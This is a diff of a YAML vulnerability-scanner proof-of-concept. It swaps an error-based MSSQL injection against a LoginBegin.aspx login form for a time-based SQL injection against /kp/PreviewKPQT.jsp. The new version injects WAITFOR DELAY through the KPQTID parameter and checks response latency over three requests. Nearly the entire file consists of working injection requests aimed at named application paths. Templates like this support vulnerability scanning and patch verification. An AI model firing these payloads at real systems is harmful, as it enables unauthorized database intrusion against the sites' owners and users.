@@ -1,19 +1,34 @@
-name: poc-yaml-test
+name: poc-yaml-test-sqli
 manual: true
 transport: http
 set:
-  num: randomInt(80000, 100000)
+  sleepSecond1: randomInt(6, 8)
+  sleepSecond2: randomInt(3, 5)
 rules:
   r0:
     request:
       cache: true
-      method: POST
-      path: /Portal/LoginBegin.aspx?ReturnUrl=%2f
-      headers:
-        Content-Type: application/x-www-form-urlencoded
-      body: Todo=Validate&LoginName=1%27+AND+5094+IN+%28RIGHT%28sys.fn_VarBinToHexStr%28hashbytes%28%27MD5%27%2C%27{{num}}%27%29%29%2C32%29%29+AND+%27JKJg%27=%27JKJg&Password=&CDomain=Local&FromUrl=
-      follow_redirects: true
-    expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(num)), 0, 31)))
-expression: r0()
+      method: GET
+      path: /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A0%27--
+    expression: response.status == 200 && response.body_string.contains("title") && response.body_string.contains("HTML")
+    output:
+      r0latency: response.latency
+  r1:
+    request:
+      cache: true
+      method: GET
+      read_timeout: "10"
+      path: /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{sleepSecond1}}%27--
+    expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000 && response.body_string.contains("title") && response.body_string.contains("HTML")
+  r2:
+    request:
+      cache: true
+      method: GET
+      read_timeout: "10"
+      path: /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{sleepSecond2}}%27--
+    expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000 && response.body_string.contains("title") && response.body_string.contains("HTML")
+expression: r0() && r1() && r2()
 detail:
   author: k3ppf0r
+  links:
+    - https://blog.csdn.net/qq_41904294/article/details/140684150?spm=1001.2014.3001.5502
